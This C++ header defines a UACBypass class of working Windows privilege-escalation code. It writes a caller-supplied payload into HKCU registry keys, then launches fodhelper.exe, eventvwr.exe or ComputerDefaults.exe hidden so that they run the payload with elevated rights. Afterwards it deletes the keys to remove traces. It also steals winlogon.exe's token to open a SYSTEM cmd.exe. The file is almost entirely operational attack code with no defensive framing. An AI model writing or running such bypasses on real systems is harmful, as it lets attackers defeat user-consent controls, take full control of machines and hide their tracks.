#ifndef UAC_BYPASS_H
#define UAC_BYPASS_H

#include <windows.h>
#include <shlobj.h>
#include <stdio.h>

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")

class UACBypass {
public:
    // Method 1: fodhelper.exe hijack (Windows 10)
    static bool FodhelperBypass(const char* payload) {
        HKEY hKey;
        const char* regPath = "Software\\Classes\\ms-settings\\shell\\open\\command";
        
        // Create registry keys
        if (RegCreateKeyExA(HKEY_CURRENT_USER, regPath, 0, NULL, REG_OPTION_NON_VOLATILE, 
            KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS)
            return false;
            
        // Set payload
        RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)payload, strlen(payload) + 1);
        RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (BYTE*)"", 1);
        RegCloseKey(hKey);
        
        // Execute fodhelper
        ShellExecuteA(NULL, NULL, "C:\\Windows\\System32\\fodhelper.exe", NULL, NULL, SW_HIDE);
        
        // Cleanup
        Sleep(3000);
        RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
        
        return true;
    }
    
    // Method 2: eventvwr.exe hijack (Windows 7-10)
    static bool EventVwrBypass(const char* payload) {
        HKEY hKey;
        const char* regPath = "Software\\Classes\\mscfile\\shell\\open\\command";
        
        if (RegCreateKeyExA(HKEY_CURRENT_USER, regPath, 0, NULL, REG_OPTION_NON_VOLATILE, 
            KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS)
            return false;
            
        RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)payload, strlen(payload) + 1);
        RegCloseKey(hKey);
        
        ShellExecuteA(NULL, NULL, "C:\\Windows\\System32\\eventvwr.exe", NULL, NULL, SW_HIDE);
        
        Sleep(3000);
        RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\mscfile");
        
        return true;
    }
    
    // Method 3: ComputerDefaults.exe hijack
    static bool ComputerDefaultsBypass(const char* payload) {
        HKEY hKey;
        const char* regPath = "Software\\Classes\\ms-settings\\shell\\open\\command";
        
        if (RegCreateKeyExA(HKEY_CURRENT_USER, regPath, 0, NULL, REG_OPTION_NON_VOLATILE, 
            KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS)
            return false;
            
        RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)payload, strlen(payload) + 1);
        RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (BYTE*)"", 1);
        RegCloseKey(hKey);
        
        ShellExecuteA(NULL, NULL, "C:\\Windows\\System32\\ComputerDefaults.exe", NULL, NULL, SW_HIDE);
        
        Sleep(3000);
        RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
        
        return true;
    }
    
    // Method 4: Token duplication (requires SeDebugPrivilege)
    static bool TokenDuplication() {
        HANDLE hToken, hDupToken;
        STARTUPINFOA si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        
        // Get SYSTEM token from winlogon.exe
        DWORD winlogonPID = 0;
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) return false;
        
        PROCESSENTRY32 pe = {0};
        pe.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe)) {
            do {
                if (_stricmp(pe.szExeFile, "winlogon.exe") == 0) {
                    winlogonPID = pe.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
        
        if (winlogonPID == 0) return false;
        
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, winlogonPID);
        if (!hProcess) return false;
        
        if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken)) {
            CloseHandle(hProcess);
            return false;
        }
        
        if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDupToken)) {
            CloseHandle(hToken);
            CloseHandle(hProcess);
            return false;
        }
        
        // Create process with SYSTEM token
        char cmdline[] = "cmd.exe";
        BOOL result = CreateProcessAsUserA(hDupToken, NULL, cmdline, NULL, NULL, FALSE, 
            CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
        
        CloseHandle(hDupToken);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        
        if (result) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        
        return result;
    }
    
    // Check if running as admin
    static bool IsElevated() {
        BOOL isElevated = FALSE;
        HANDLE hToken = NULL;
        
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            TOKEN_ELEVATION elevation;
            DWORD size;
            
            if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &size)) {
                isElevated = elevation.TokenIsElevated;
            }
            CloseHandle(hToken);
        }
        
        return isElevated;
    }
};

#endif
